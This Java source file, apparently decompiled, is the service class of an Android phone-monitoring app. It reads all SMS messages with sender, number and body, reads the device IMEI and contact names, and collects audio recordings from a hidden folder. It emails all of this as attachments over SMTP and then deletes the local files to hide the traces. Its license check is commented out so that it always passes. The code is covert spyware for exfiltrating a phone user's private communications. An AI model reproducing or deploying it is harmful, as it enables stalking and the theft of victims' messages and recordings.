package com.shiliukeji.xc_lsy.androidkillerservice.service;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v4.app.NotificationCompat;
import android.support.v4.view.MotionEventCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.mail.MailSenderInfo;
import com.shiliukeji.xc_lsy.androidkillerservice.mail.SimpleMailSender;

import org.apache.http.util.EncodingUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.StringTokenizer;


/**
 * Created by XC_LSY on 2017/7/6.
 */

public class OtherOperatorService {
    Context context;

    static class AnonymousClass1 implements Runnable {
        private final /* synthetic */ String val$content;
        private final /* synthetic */ String val$from;
        private final /* synthetic */ String val$password;
        private final /* synthetic */ String val$port;
        private final /* synthetic */ String val$smtp;
        private final /* synthetic */ String val$subject;
        private final /* synthetic */ String[] val$tos;
        private final /* synthetic */ String val$userEmail;

        AnonymousClass1(String str, String str2, String str3, String str4, String str5, String[] strArr, String str6, String str7) {
            this.val$smtp = str;
            this.val$port = str2;
            this.val$userEmail = str3;
            this.val$password = str4;
            this.val$from = str5;
            this.val$tos = strArr;
            this.val$subject = str6;
            this.val$content = str7;
        }

        public void run() {
            MailSenderInfo mailInfo = new MailSenderInfo(this.val$smtp, this.val$port, this.val$userEmail, this.val$password, true);
            mailInfo.setFromAddress(this.val$from);
            mailInfo.setReceivers(this.val$tos);
            mailInfo.setSubject(this.val$subject);
            mailInfo.setContent(this.val$content);
            new SimpleMailSender().sendHtmlMail(mailInfo);
        }
    }

    static class AnonymousClass2 implements Runnable {
        private final /* synthetic */ String val$content;
        private final /* synthetic */ String val$from;
        private final /* synthetic */ String val$password;
        private final /* synthetic */ String val$pathString;
        private final /* synthetic */ List val$paths;
        private final /* synthetic */ String val$port;
        private final /* synthetic */ String val$smtp;
        private final /* synthetic */ String val$subject;
        private final /* synthetic */ String val$to;
        private final /* synthetic */ String val$userEmail;

        AnonymousClass2(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, List list, String str9) {
            this.val$smtp = str;
            this.val$port = str2;
            this.val$userEmail = str3;
            this.val$password = str4;
            this.val$from = str5;
            this.val$to = str6;
            this.val$subject = str7;
            this.val$content = str8;
            this.val$paths = list;
            this.val$pathString = str9;
        }

        public void run() {
            MailSenderInfo mailInfo = new MailSenderInfo(this.val$smtp, this.val$port, this.val$userEmail, this.val$password, true);
            mailInfo.setFromAddress(this.val$from);
            mailInfo.setToAddress(this.val$to);
            mailInfo.setSubject(this.val$subject);
            mailInfo.setContent(this.val$content);
            mailInfo.setAttachFileNames(this.val$paths);
            if (new SimpleMailSender().sendAttachMail(mailInfo)) {
                OtherOperatorService.deleteFile(this.val$paths);
                OtherOperatorService.deleteML(this.val$pathString);
                return;
            }
            File file = new File(this.val$pathString, "phone.txt");
            if (file.exists()) {
                file.delete();
                file = new File(this.val$pathString, "phone.txt");
            }
            OtherOperatorService.txtFileSave(file, "1" + this.val$content);
        }
    }

    static class AnonymousClass3 implements Runnable {
        private final /* synthetic */ String val$content;
        private final /* synthetic */ String val$from;
        private final /* synthetic */ String val$password;
        private final /* synthetic */ String val$pathString;
        private final /* synthetic */ List val$paths;
        private final /* synthetic */ String val$port;
        private final /* synthetic */ String val$smtp;
        private final /* synthetic */ String val$subject;
        private final /* synthetic */ String val$to;
        private final /* synthetic */ String val$userEmail;

        AnonymousClass3(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, List list, String str9) {
            this.val$smtp = str;
            this.val$port = str2;
            this.val$userEmail = str3;
            this.val$password = str4;
            this.val$from = str5;
            this.val$to = str6;
            this.val$subject = str7;
            this.val$content = str8;
            this.val$paths = list;
            this.val$pathString = str9;
        }

        public void run() {
            MailSenderInfo mailInfo = new MailSenderInfo(this.val$smtp, this.val$port, this.val$userEmail, this.val$password, true);
            mailInfo.setFromAddress(this.val$from);
            mailInfo.setToAddress(this.val$to);
            mailInfo.setSubject(this.val$subject);
            mailInfo.setContent(this.val$content);
            mailInfo.setAttachFileNames(this.val$paths);
            if (new SimpleMailSender().sendAttachMail(mailInfo)) {
                OtherOperatorService.deleteFile(this.val$paths);
                OtherOperatorService.deleteML(this.val$pathString);
            }
        }
    }

    public OtherOperatorService(Context context) {
        this.context = context;
    }

    public static String getPhoneImai(Context context) {
        return ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId().trim().toUpperCase(Locale.US);
    }

    public static boolean isServiceRunning(Context context) {
        for (ActivityManager.RunningServiceInfo service : ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE)).getRunningServices(Integer.MAX_VALUE)) {
            if ("com.android.example.service.PhoneService".equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public static void uploadEmail(String smtp, String port, String userEmail, String password, String from, String[] tos, String subject, String content) {
        XLog.d("TAG发送邮件信息！");
        new Thread(new AnonymousClass1(smtp, port, userEmail, password, from, tos, subject, content)).start();
    }

    public static void uploadEmail(List<String> paths, String pathString, String smtp, String port, String userEmail, String password, String from, String to, String subject, String content) {
        XLog.d("TAG2 EmailSent");
        new Thread(new AnonymousClass2(smtp, port, userEmail, password, from, to, subject, content, paths, pathString)).start();
    }

    public static void uploadAllEmail(List<String> paths, String pathString, String smtp, String port, String userEmail, String password, String from, String to, String subject, String content) {
        XLog.d("TAG2 EmailSent");
        new Thread(new AnonymousClass3(smtp, port, userEmail, password, from, to, subject, content, paths, pathString)).start();
    }

    public static void deleteFile(List<String> paths) {
        if (paths != null) {
            for (String path : paths) {
                new File(path).delete();
            }
        }
    }

    public static void deleteML(String path) {
        if (path != null) {
            File file = new File(path);
            if (file.isFile()) {
                file.delete();
            }
            if (file.isDirectory()) {
                File[] childFiles = file.listFiles();
                if (childFiles == null || childFiles.length == 0) {
                    file.delete();
                }
                for (File delete : childFiles) {
                    delete.delete();
                }
                file.delete();
            }
        }
    }

    public static List<String> getFilePathList(File path) {
        List<String> filePathList = new ArrayList();
        if (!path.isDirectory()) {
            return null;
        }
        File[] currentFiles = path.listFiles();
        if (currentFiles.length <= 0) {
            return null;
        }
        for (File currentFile : currentFiles) {
            if (currentFile.length() != 0) {
                String filePath = currentFile.getAbsolutePath();
                if (filePath.contains(".amr") || filePath.contains(".tb")) {
                    filePathList.add(filePath);
                }
            }
        }
        return filePathList;
    }

    public static String getSmsInPhone(Context context) {
        String SMS_URI_ALL = "content://sms/";
        StringBuilder smsBuilder = new StringBuilder();
        try {
            Cursor cur = context.getContentResolver().query(Uri.parse("content://sms/"), new String[]{"_id", "address", "person", "body", "date", "type"}, null, null, "date desc");
            if (cur.moveToFirst()) {
                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");
                do {
                    String type;
                    String name = cur.getString(nameColumn);
                    String phoneNumber = cur.getString(phoneNumberColumn);
                    String smsbody = cur.getString(smsbodyColumn);
                    String date = getCurrentTime(Long.valueOf(Long.parseLong(cur.getString(dateColumn))));
                    int typeId = cur.getInt(typeColumn);
                    if (typeId == 1) {
                        type = "收到";
                    } else if (typeId == 2) {
                        type = "发出";
                    } else {
                        type = "";
                    }
                    smsBuilder.append(new StringBuilder(String.valueOf(date)).append(type).append(":<br/>").toString());
                    smsBuilder.append("姓名：" + name + "<br/>");
                    smsBuilder.append("号码：" + phoneNumber + "<br/>");
                    smsBuilder.append("内容：" + smsbody + "<br/>----------------------------------------<br/>");
                    if (smsbody == null) {
                        smsbody = "";
                    }
                } while (cur.moveToNext());
            } else {
                smsBuilder.append("没有短信!");
            }
            smsBuilder.append("已完成操作!");
        } catch (SQLiteException ex) {
            Log.d("SE in getSmsInPhone", ex.getMessage());
        }
        return smsBuilder.toString();
    }

    public static void txtFileSave(File file, String filecontent) {
        try {
            FileOutputStream outStream = new FileOutputStream(file, true);
            outStream.write(filecontent.getBytes());
            outStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getTxtHistory(File file) {
        String res = "";
        if (!file.exists()) {
            return "";
        }
        try {
            FileInputStream fin = new FileInputStream(file.getAbsolutePath());
            byte[] buffer = new byte[fin.available()];
            fin.read(buffer);
            res = new StringBuilder(String.valueOf(res)).append(EncodingUtils.getString(buffer, "UTF-8")).toString();
            fin.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return res;
    }

    public static String setJtingPath(Context context) {
        if ("mounted".equals(Environment.getExternalStorageState())) {
            return new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath())).append("/PhoneSystem").toString();
        }
        return new StringBuilder(String.valueOf(context.getApplicationContext().getFilesDir().getAbsolutePath())).append("/PhoneSystem").toString();
    }

    public static boolean checkAllNetwork(Context context) {
        NetworkInfo info = ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info != null && info.isConnected() && info.isAvailable()) {
            return true;
        }
        return false;
    }

    public static boolean check3Gwifi(Context context) {
        ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo infoM = manager.getNetworkInfo(0);
        if (manager.getNetworkInfo(1).isConnected() || infoM.isConnected()) {
            return true;
        }
        return false;
    }

    public static boolean checkwifiwork(Context context) {
        if (((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE)).getNetworkInfo(1).isConnected()) {
            return true;
        }
        return false;
    }

    public static String getTimeLenth(long start, long stop) {
        int temp = (int) (stop - start);
        int hour = temp / 3600000;
        int min = (temp - (3600000 * hour)) / 60000;
        return new StringBuilder(String.valueOf(hour)).append("时").append(min).append("分")
                .append(((temp - (hour * 3600000)) - (min * 60000)) / 1000).append("秒").toString();
    }

    public static String getCurrentTime() {
        Date date = new Date(System.currentTimeMillis());
        Calendar cal = Calendar.getInstance();
        cal.setTime(date);
        return cal.get(Calendar.YEAR) + "年" + (cal.get(Calendar.MONTH) + 1) + "月"
                + cal.get(Calendar.DAY_OF_MONTH) + "日" + cal.get(Calendar.HOUR) + ":"
                + cal.get(Calendar.MINUTE) + ":" + cal.get(Calendar.SECOND);
    }

    public static String getCurrentTime(Long d) {
        Date date = new Date(d.longValue());
        Calendar cal = Calendar.getInstance();
        cal.setTime(date);
        return cal.get(Calendar.YEAR) + "年" + (cal.get(Calendar.MONTH) + 1) + "月"
                + cal.get(Calendar.DAY_OF_MONTH) + "日" + cal.get(Calendar.HOUR) + ":"
                + cal.get(Calendar.MINUTE) + ":" + cal.get(Calendar.SECOND);
    }

    public static String getCurrentYMD() {
        Date date = new Date(System.currentTimeMillis());
        Calendar cal = Calendar.getInstance();
        cal.setTime(date);
        return cal.get(Calendar.YEAR) + "年" + (cal.get(Calendar.MONTH) + 1) + "月"
                + cal.get(Calendar.DAY_OF_MONTH) + "日";
    }

    public static String getContactNameFromPhoneBook(Context context, String phoneNum) {
        String contactName = "";
        Cursor pCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "data1 = ?", new String[]{phoneNum}, null);
        if (pCur.moveToFirst()) {
            contactName = pCur.getString(pCur.getColumnIndex("display_name"));
            pCur.close();
        }
        if ("".equals(contactName) || contactName == null) {
            return "匿名号码";
        }
        return contactName;
    }

    public static String MD5(String str) {
        MessageDigest messageDigest = null;
        try {
            messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.reset();
            messageDigest.update(str.getBytes("UTF-8"));
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e2) {
            e2.printStackTrace();
        }
        byte[] byteArray = messageDigest.digest();
        StringBuffer md5StrBuff = new StringBuffer();
        for (int i = 0; i < byteArray.length; i++) {
            if (Integer.toHexString(byteArray[i] & MotionEventCompat.ACTION_MASK).length() == 1) {
                md5StrBuff.append("0").append(Integer.toHexString(byteArray[i] & MotionEventCompat.ACTION_MASK));
            } else {
                md5StrBuff.append(Integer.toHexString(byteArray[i] & MotionEventCompat.ACTION_MASK));
            }
        }
        return md5StrBuff.toString().toUpperCase(Locale.US);
    }

    public static boolean isReg(String arg0, String arg1, String arg2) {
        if ("".equals(arg0) || arg0 == null) {
            return false;
        }
        if ("".equals(arg1) || arg1 == null) {
            return false;
        }
        if ("".equals(arg2) || arg2 == null) {
            return false;
        }
//        try {
//            String g = MD5(new StringBuilder(String.valueOf(arg0)).append("0o").toString());
//            String h = MD5(new StringBuilder(String.valueOf(arg1)).append("0o").toString());
//            int i = Integer.parseInt(arg2.substring(0, 1));
//            int j = Integer.parseInt(arg2.substring(arg2.length() - 1, arg2.length()));
//            String m = new StringBuilder(String.valueOf(i)).append(g.substring(j, i + j)).append(j).toString();
//            String n = new StringBuilder(String.valueOf(i)).append(h.substring(j, i + j)).append(j).toString();
//            if (m.equals(arg2) || n.equals(arg2)) {
//                return true;
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        return true;
    }

    public static void showNotisfy(Context context, int icon, String tickertext, String title, String content) {
        Notification notification = null;
        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context);
        mBuilder.setContentTitle(title)
                .setContentInfo(content);
        notification =  mBuilder.build();
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).notify(10, notification);
    }

    public static String getImei(Context context, int i) {
        String szImei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId().trim().toUpperCase(Locale.US);
        if (szImei != null && !"".equals(szImei)) {
            return szImei.substring(szImei.length() - i, szImei.length());
        }
        for (int j = 0; j < i; j++) {
            szImei = new StringBuilder(String.valueOf(szImei)).append("9").toString();
        }
        return szImei;
    }

    public static String getCardName(String arg0) {
        if (arg0.startsWith("46000") || arg0.startsWith("46002")) {
            return "中国移动卡";
        }
        if (arg0.startsWith("46001")) {
            return "中国联通卡";
        }
        if (arg0.startsWith("46003")) {
            return "中国电信卡";
        }
        return "无卡或无效卡";
    }

    public static String getSubstring(String string) {
        try {
            String[] tempc = toArray(myReplace(string.substring(string.indexOf("[") + 1, string.indexOf("]")), "},", "}|"), "|");
            String newString = "";
            for (String myReplace : tempc) {
                String temp = myReplace(myReplace(myReplace(myReplace(myReplace, "\"addr\":\"", "*"), "\",\"dis", "#"), "\"name\":\"", "["), "\",\"tel", "]");
                int names = temp.indexOf("[");
                newString = new StringBuilder(String.valueOf(newString)).append(temp.substring(names + 1, temp.indexOf("]"))).append("(").append(temp.substring(temp.indexOf("*") + 1, temp.indexOf("#"))).append(");").toString();
            }
            return newString;
        } catch (Exception e) {
            return "err" + string;
        }
    }

    public static String myReplace(String s, String org, String ob) {
        String newString = "";
        while (s.indexOf(org) != -1) {
            int first = s.indexOf(org);
            if (first != s.length()) {
                newString = new StringBuilder(String.valueOf(newString)).append(s.substring(0, first)).append(ob).toString();
                s = s.substring(org.length() + first, s.length());
            }
        }
        return new StringBuilder(String.valueOf(newString)).append(s).toString();
    }

    public static String[] toArray(String oriString, String separator) {
        if (oriString == null) {
            throw new NullPointerException("The parameter [string] cannot be null.");
        } else if (separator == null) {
            throw new NullPointerException("The parameter [separator] cannot be null.");
        } else if (separator.length() == 0) {
            throw new IllegalArgumentException("The parameter [separator] cannot be empty.");
        } else {
            StringTokenizer st = new StringTokenizer(oriString, separator);
            List list = new LinkedList();
            while (st.hasMoreTokens()) {
                list.add(st.nextToken());
            }
            return (String[]) list.toArray(new String[list.size()]);
        }
    }

}
